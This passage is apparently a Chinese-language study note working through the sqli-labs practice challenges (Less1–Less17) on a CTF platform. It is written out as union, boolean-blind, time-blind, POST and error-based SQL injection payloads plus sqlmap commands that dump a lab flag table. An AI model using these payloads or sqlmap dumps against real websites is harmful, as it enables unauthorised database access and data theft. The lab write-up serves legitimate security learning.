class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(length((select group_concat(schema_name) from information_schema.schemata))&gt;10,sleep(5),1)--+</span></span><br></pre></td></tr></table></figure><p><strong>判断数据库具体字符</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(ascii(substr(((select group_concat(schema_name) from information_schema.schemata)),1,1))&gt;10,sleep(5),1)--+</span></span><br></pre></td></tr></table></figure><p><strong>其他的不演试了，这函数嵌套的太多了</strong></p><h5 id="使用-sqlmap-1"><a href="#使用-sqlmap-1" class="headerlink" title="使用 sqlmap"></a><strong>使用 sqlmap</strong></h5><p><strong>不用 sqlmap 的话，写脚本我不会写，水平有限</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>fb38469f<span class="operator">-</span>e856<span class="number">-4765</span><span class="number">-99</span>c5<span class="operator">-</span>a785393f23ee.node5.buuoj.cn<span class="operator">/</span>Less<span class="number">-9</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--technique T --dbs</span></span><br></pre></td></tr></table></figure><p><strong>这里多了一个新选项，还是看不懂，选是</strong></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732114103339-6aa0d45b-46fa-451a-b5ae-9eccd72ac4a2.png" referrerpolicy="no-referrer"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732114314086-100af4c4-8299-4028-bafc-2bd832c20604.png" referrerpolicy="no-referrer"></p><p><strong>后面还是老套路，直接跳最后一步吧</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>fb38469f<span class="operator">-</span>e856<span class="number">-4765</span><span class="number">-99</span>c5<span class="operator">-</span>a785393f23ee.node5.buuoj.cn<span class="operator">/</span>Less<span class="number">-9</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--technique T -D ctftraining -T flag -C flag --dump</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732116546294-d5cb9ccb-bf3d-4399-8974-b9cdfa88f4b4.png" referrerpolicy="no-referrer"></p><h3 id="POST-型注入"><a href="#POST-型注入" class="headerlink" title="POST 型注入"></a>POST 型注入</h3><p><strong>是把注入点由 get 方式换为了 post 方式</strong></p><p><strong>以 Less11 为例</strong></p><h4 id="手注"><a href="#手注" class="headerlink" title="手注"></a>手注</h4><p><strong>给了俩框</strong></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732159762288-1c950041-986f-436e-bc2b-d5fbb75b31c6.png" referrerpolicy="no-referrer"></p><p>抓下包</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732159872021-dcbd89ac-8602-46cb-9e5d-b25c18f5dd78.png" referrerpolicy="no-referrer"></p><p>测试一下闭合，输入 1’，出现错误信息，而 1”没有错误信息</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732161165987-c3628174-dd88-4757-bcd8-0f989143073d.png" referrerpolicy="no-referrer"></p><p>输入恒等式测试，成功。看出是单引号闭合</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or 1=1#</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732161343221-ca242211-3caa-4729-ab83-8e3dfae033ae.png" referrerpolicy="no-referrer"></p><p>或者输入转义字符，看出单引号闭合</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>\</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732161446432-3dc4a1a4-1d56-4a88-90e8-f6205f31b0f8.png" referrerpolicy="no-referrer"></p><p>接下来就是联合注入了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(schema_name) from information_schema.schemata#</span></span><br><span class="line"><span class="string">-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;ctftraining&#x27;</span>#</span><br><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>flag<span class="string">&#x27;#</span></span><br><span class="line"><span class="string">-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(flag) <span class="keyword">from</span> ctftraining.flag#</span><br></pre></td></tr></table></figure><h4 id="使用-sqlmap-2"><a href="#使用-sqlmap-2" class="headerlink" title="使用 sqlmap"></a>使用 sqlmap</h4><p>使用 burp 抓包，之后右键复制到文件，使用 txt 后缀</p><p>之后进入 sqlmap，按如下格式输入</p><p>比如我保存在 post_test 文件夹下</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732162828346-51296ff1-e954-40a7-aa32-cd5c7be63b0b.png" referrerpolicy="no-referrer"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>r post_test\less11.txt <span class="operator">-</span>dbs</span><br></pre></td></tr></table></figure><p>成功爆库</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732162847444-a44cb980-b1ab-4c24-bb3f-47fdf887475e.png" referrerpolicy="no-referrer"></p><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><h4 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h4><p><strong>报错注入是通过特殊函数错误使用并使其输出错误结果来获取信息的。是一种页面响应形式。</strong></p><p><strong>响应过程：</strong></p><blockquote><p><strong>用户在前台页面输入检索内容</strong><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732244222875-145b09d5-dff6-4da4-a827-f1e56ccc34ea.png" referrerpolicy="no-referrer"><strong>后台将前台页面上输入的检索内容</strong>**<font style="color:#fe2c24">无加区别</font><strong><strong>的拼接成sql语句，送给数据库执行</strong><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732244223140-0176273e-e00a-4867-a286-90a75f584170.png" referrerpolicy="no-referrer"><strong>数据库将执行的结果返回后台，后台将数据库执行的结果</strong></strong><font style="color:#fe2c24">无加区别</font>**<strong>的显示在前台页面</strong></p></blockquote><p><strong>报错注入存在基础：</strong></p><blockquote><p><strong>后台对于输入输出的合理性没有做检查</strong></p></blockquote><h4 id="extractvalue报错注入"><a href="#extractvalue报错注入" class="headerlink" title="extractvalue报错注入"></a>extractvalue报错注入</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">EXTRACTVALUE (XML_document, XPath_string);</span><br><span class="line">第一个参数：XML_document是String格式，为XML文档对象的名称</span><br><span class="line">第二个参数：XPath_string (Xpath格式的字符串)</span><br></pre></td></tr></table></figure><p><strong>补充：什么是 xml？</strong><a href="about:blank"><strong>XML 学习</strong></a></p><h4 id="updatexml报错注入"><a href="#updatexml报错注入" class="headerlink" title="updatexml报错注入"></a><strong>updatexml报错注入</strong></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">函数updatexml(XML_document,XPath_string,new_value)</span><br><span class="line">第一个参数: XML_document是string格式，为XML文档对象的名称，例如Doc</span><br><span class="line">第二个参数: XPath string是路径，XPath格式的字符串</span><br><span class="line">第三个参数: new_value，string格式，替换查找到的符合条件的数据</span><br></pre></td></tr></table></figure><h4 id="floor报错注入"><a href="#floor报错注入" class="headerlink" title="floor报错注入"></a>floor报错注入</h4><p>** 这种注入方式与以上两种方式原理上存在很大的区别，相对来说要复杂很多。**<a target="_blank" rel="noopener" href="https://www.cnblogs.com/c1047509362/p/12806297.html"><strong>参考文章</strong></a></p><p>*<em>原理：利用select count(</em>),floor(rand(0)*2)x from information_schema.character_sets group by x;导致数据库报错，通过concat函数连接注入语句与floor(rand(0)*2)函数，实现将注入结果与报错信息回显的注入方式。 **</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 每次产生<span class="number">0</span><span class="number">-1</span>的随机数，若随机数种子一样，则产生的随机数也一样</span><br><span class="line">rand()</span><br><span class="line"># 计数 </span><br><span class="line"><span class="built_in">count</span>()</span><br><span class="line"># 按照x分类</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> x</span><br></pre></td></tr></table></figure><h4 id="例题：以-Less17-为例"><a href="#例题：以-Less17-为例" class="headerlink" title="例题：以 Less17 为例"></a>例题：以 Less17 为例</h4><p><strong>这题情景是要重置密码</strong></p><p>根据页面展示是一个密码重置页面，也就是说我们已经登录系统了，然后查看我们源码，是根据我们提供的账户名去数据库查看用户名和密码，如果账户名正确那么将密码改成你输入的密码。再执行这条sql语句之前会对输入的账户名进行检查，对输入的特殊字符转义。所以我们能够利用的只有更新密码的sql语句。sql语句之前都是查询，这里有一个update更新数据库里面信息。所以之前的联合注入和布尔盲注以及时间盲注都不能用了。这里我们会用到报错注入。</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732253469819-c8df1780-5360-4044-a23c-c9d641a4efcf.png" referrerpolicy="no-referrer"></p><h5 id="extractvalue报错注入-1"><a href="#extractvalue报错注入-1" class="headerlink" title="extractvalue报错注入"></a><strong>extractvalue报错注入</strong></h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 爆版本</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and (extractvalue(1,concat(0x5c,version(),0x5c)))#</span></span><br><span class="line"><span class="string"># 爆当前数据库</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> (extractvalue(<span class="number">1</span>,concat(<span class="number">0x5c</span>,database(),<span class="number">0x5c</span>)))#</span><br><span class="line"># 爆所有数据库</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and (extractvalue(1,concat(0x5c,(select group_concat(schema_name) from information_schema.schemata),0x5c)))#</span></span><br><span class="line"><span class="string"># 爆表名</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> (extractvalue(<span class="number">1</span>,concat(<span class="number">0x5c</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;ctftraining&#x27;</span>),<span class="number">0x5c</span>)))#</span><br><span class="line"># 爆字段名</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and (extractvalue(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>flag<span class="string">&#x27;),0x5c)))#</span></span><br><span class="line"><span class="string"># 爆字段内容</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> (extractvalue(<span class="number">1</span>,concat(<span class="number">0x5c</span>,(<span class="keyword">select</span> group_concat(flag) <span class="keyword">from</span> ctftraining.flag),<span class="number">0x5c</span>)))#</span><br></pre></td></tr></table></figure><p><strong>只粘贴最后一步和结果</strong></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732255050847-e0a17c31-7401-4659-aeb4-269a809994c4.png" referrerpolicy="no-referrer"></p><p>结果</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732255080675-c801e8f2-13d9-4920-8431-cda677c7a013.png" referrerpolicy="no-referrer"></p><h5 id="updatexml报错注入-1"><a href="#updatexml报错注入-1" class="headerlink" title="updatexml报错注入"></a><strong>updatexml报错注入</strong></h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 爆版本</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and (updatexml(1,concat(0x5c,version(),0x5c),1))#</span></span><br><span class="line"><span class="string"># 爆当前数据库</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> (updatexml(<span class="number">1</span>,concat(<span class="number">0x5c</span>,database(),<span class="number">0x5c</span>),<span class="number">1</span>))#</span><br><span class="line"># 爆所有数据库</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and (updatexml(1,concat(0x5c,(select group_concat(schema_name) from information_schema.schemata),0x5c),1))#</span></span><br><span class="line"><span class="string"># 爆表名</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> (updatexml(<span class="number">1</span>,concat(<span class="number">0x5c</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;ctftraining&#x27;</span>),<span class="number">0x5c</span>),<span class="number">1</span>))#</span><br><span class="line"># 爆字段名</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and (updatexml(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>flag<span class="string">&#x27;),0x5c),1))#</span></span><br><span class="line"><span class="string"># 爆字段内容</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> (updatexml(<span class="number">1</span>,concat(<span class="number">0x5c</span>,(<span class="keyword">select</span> group_concat(flag) <span class="keyword">from</span> ctftraining.flag),<span class="number">0x5c</span>),<span class="number">1</span>))#</span><br></pre></td></tr></table></figure><h5 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>r post_test\less17.txt <span class="comment">--technique E -dbs</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732257712411-9a9d5bea-e429-419c-99f7-86d83c5d2d44.png" referrerpolicy="no-referrer"></p><p><strong>后面的不说了</strong></p><h2 id="八、sqli-labs-靶场（BUU-题库）"><a href="#八、sqli-labs-靶场（BUU-题库）" class="headerlink" title="八、sqli-labs 靶场（BUU 题库）"></a><strong>八、sqli-labs 靶场（BUU 题库）</strong></h2><h3 id="Less1-Less4（联合注入）"><a href="#Less1-Less4（联合注入）" class="headerlink" title="Less1-Less4（联合注入）"></a>Less1-Less4（联合注入）</h3><p><strong>注：出现的类型在笔记里有详细题解，不再多写回显的判断了，以下只判断注入和闭合的类型，并粘贴最后的注入语句。</strong></p><h4 id="Less1："><a href="#Less1：" class="headerlink" title="Less1："></a>Less1：</h4><p>笔记写过了，不再提，只粘一下注入语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,group_concat(schema_name) from information_schema.schemata--+</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;ctftraining&#x27;</span><span class="comment">--+</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>flag<span class="string">&#x27;--+</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,flag <span class="keyword">from</span> ctftraining.flag<span class="comment">--+</span></span><br></pre></td></tr></table></figure><h4 id="Less2："><a href="#Less2：" class="headerlink" title="Less2："></a>Less2：</h4><p>转义字符判断出是数字型注入</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732028251075-4ef649da-85d1-41f8-89c1-3eaf81457340.png" referrerpolicy="no-referrer"></p><p>注入语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;ctftraining&#x27;</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span><span class="comment">--+</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,flag <span class="keyword">from</span> ctftraining.flag</span><br></pre></td></tr></table></figure><h4 id="Less3："><a href="#Less3：" class="headerlink" title="Less3："></a>Less3：</h4><p>判断出是单引号加括号闭合</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732028447416-82a5cdd3-e330-465d-b5cc-a0a4439fa98c.png" referrerpolicy="no-referrer"></p><p>注入语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;) union select 1,2,group_concat(schema_name) from information_schema.schemata--+</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span>) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;ctftraining&#x27;</span><span class="comment">--+</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>flag<span class="string">&#x27;--+</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span>) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,flag <span class="keyword">from</span> ctftraining.flag<span class="comment">--+</span></span><br></pre></td></tr></table></figure><h4 id="Less4："><a href="#Less4：" class="headerlink" title="Less4："></a><strong>Less4：</strong></h4><p><strong>判断出是双引号加括号闭合</strong></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732028554929-b2ea661e-88e2-44c8-a161-5784f21c752a.png" referrerpolicy="no-referrer"></p><p>注入语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span>&quot;) union select 1,2,group_concat(schema_name) from information_schema.schemata--+</span><br><span class="line">?id=-1&quot;) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;ctftraining&#x27;</span><span class="comment">--+</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span>&quot;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;--+</span><br><span class="line">?id=-1&quot;) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,flag <span class="keyword">from</span> ctftraining.flag<span class="comment">--+</span></span><br></pre></td></tr></table></figure><h3 id="Less5-Less8（布尔盲注）"><a href="#Less5-Less8（布尔盲注）" class="headerlink" title="Less5-Less8（布尔盲注）"></a>Less5-Less8（布尔盲注）</h3><h4 id="Less5："><a href="#Less5：" class="headerlink" title="Less5："></a>Less5：</h4><p>首先可以看到这个题是没有明确回显的，只知道对错，不知道内容</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732063901140-e0c0c8d3-2adb-435d-a2e2-e43983702cac.png" referrerpolicy="no-referrer"></p><p>首先先看一下闭合形式，是单引号<img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732063992855-3fdfd596-2b52-4339-b9c4-b40c375d0a28.png" referrerpolicy="no-referrer"></p><p>使用布尔盲注</p><p>具体不说了，上面写过了。</p><h4 id="Less6："><a href="#Less6：" class="headerlink" title="Less6："></a><strong>Less6：</strong></h4><p><strong>双引号闭合，不多说了</strong></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732095113030-f80cdfab-e15b-4c32-861f-0f99dccb5a5e.png" referrerpolicy="no-referrer"></p><h4 id="Less7："><a href="#Less7：" class="headerlink" title="Less7："></a>Less7：</h4><p>报错信息被改了</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732095376281-472ccce0-c7b4-4a4a-8782-bb0748370732.png" referrerpolicy="no-referrer"></p><h5 id="第一步（测试单双引号）"><a href="#第一步（测试单双引号）" class="headerlink" title="第一步（测试单双引号）"></a>第一步（测试单双引号）</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 报错</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732095415695-3f7f6daa-cf34-42e8-8148-d3a9a87f0ff2.png" referrerpolicy="no-referrer"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 不报错</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span>&quot;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732095468890-6bda5196-8543-4265-8e51-91169ca12679.png" referrerpolicy="no-referrer"></p><h5 id="第二步（对单引号继续测试）"><a href="#第二步（对单引号继续测试）" class="headerlink" title="第二步（对单引号继续测试）"></a><strong>第二步（对单引号继续测试）</strong></h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 报错</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732095605318-ddaf4cbe-6938-4639-a5d7-87514a5f44a9.png" referrerpolicy="no-referrer"></p><h5 id="第三步（测试括号）"><a href="#第三步（测试括号）" class="headerlink" title="第三步（测试括号）"></a>第三步（测试括号）</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 报错</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;)--+</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732095690253-d180c0d6-7e67-4a13-ae67-dc17033659fe.png" referrerpolicy="no-referrer"></p><h5 id="第四步（继续加括号）"><a href="#第四步（继续加括号）" class="headerlink" title="第四步（继续加括号）"></a>第四步（继续加括号）</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 成功</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;))--+</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732095748107-f770fe02-42c3-497d-beff-6a6c6c19da48.png" referrerpolicy="no-referrer"></p><p>得到了闭合方式，之后的用脚本</p><h4 id="Less8："><a href="#Less8：" class="headerlink" title="Less8："></a>Less8：</h4><p><strong>没报错回显，按方法一</strong></p><p><strong>闭合方式是单引号</strong></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732096045372-b3afd9b0-555a-4d73-83b9-8b6852898053.png" referrerpolicy="no-referrer"></p><h3 id="Less9-Less10（延时盲注）"><a href="#Less9-Less10（延时盲注）" class="headerlink" title="Less9-Less10（延时盲注）"></a>Less9-Less10（延时盲注）</h3><p><strong>注：因为时间盲注需要借助 if 等逻辑判断，所以不能跟前两种一样，先用没有注释符的内容去判断了，要直接用加注释符和逻辑判断的语句去判断</strong></p><h4 id="Less9："><a href="#Less9：" class="headerlink" title="Less9："></a>Less9：</h4><p><strong>判断闭合</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(1=1,sleep(5),1)--+</span></span><br><span class="line"><span class="string">?id=1&quot; and if(1=1,sleep(5),1)--+</span></span><br></pre></td></tr></table></figure><p><strong>第一个有延时，但引号闭合</strong></p><h4 id="Less10："><a href="#Less10：" class="headerlink" title="Less10："></a><strong>Less10：</strong></h4><p><strong>判断闭合</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(1=1,sleep(5),1)--+</span></span><br><span class="line"><span class="string">?id=1&quot; and if(1=1,sleep(5),1)--+</span></span><br></pre></td></tr></table></figure><p><strong>第二个有延时，但双引号闭合</strong></p><h3 id="Less11-Less14（联合注入-POST-型）"><a href="#Less11-Less14（联合注入-POST-型）" class="headerlink" title="Less11-Less14（联合注入 POST 型）"></a>Less11-Less14（联合注入 POST 型）</h3><h4 id="Less11："><a href="#Less11：" class="headerlink" title="Less11："></a>Less11：</h4><p>输入 1\，看出是单引号闭合</p><h4 id="Less12："><a href="#Less12：" class="headerlink" title="Less12："></a>Less12：</h4><p><strong>老方法，看出是双引号加括号闭合</strong></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732163087650-ba716764-31f4-4979-b5fc-e4c0b65ebaf8.png" referrerpolicy="no-referrer"></p><h4 id="Less13："><a href="#Less13：" class="headerlink" title="Less13："></a>Less13：</h4><p><strong>单引号加括号闭合</strong></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732163041484-7d38f0bb-ed88-49ff-afc6-1c6fa9ff3a15.png" referrerpolicy="no-referrer"></p><h4 id="Less14："><a href="#Less14：" class="headerlink" title="Less14："></a>Less14：</h4><p><strong>双引号闭合</strong></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732163150873-2db4562c-9eb5-488e-86e5-db8e293a08ba.png" referrerpolicy="no-referrer"></p><h3 id="Less15-Less16（布尔盲注-POST-型）"><a href="#Less15-Less16（布尔盲注-POST-型）" class="headerlink" title="Less15-Less16（布尔盲注 POST 型）"></a>Less15-Less16（布尔盲注 POST 型）</h3><h4 id="Less15："><a href="#Less15：" class="headerlink" title="Less15："></a>Less15：</h4><p><strong>已经没有报错信息了，但是通过测试发现，还有正确与错误的信息作比较，那这就是盲注</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 页面正确</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; or 1=1#</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732163491673-2216f3b2-aceb-4df4-806b-409797839f4b.png" referrerpolicy="no-referrer"></p><p>使用 sqlmap</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>r post_test\less15.txt <span class="operator">-</span>dbs</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732167607886-73b89cfb-d53b-46fd-a269-a9ad5bddee53.png" referrerpolicy="no-referrer"></p><p>很奇怪的是，指定了布尔类型却没反应</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>r 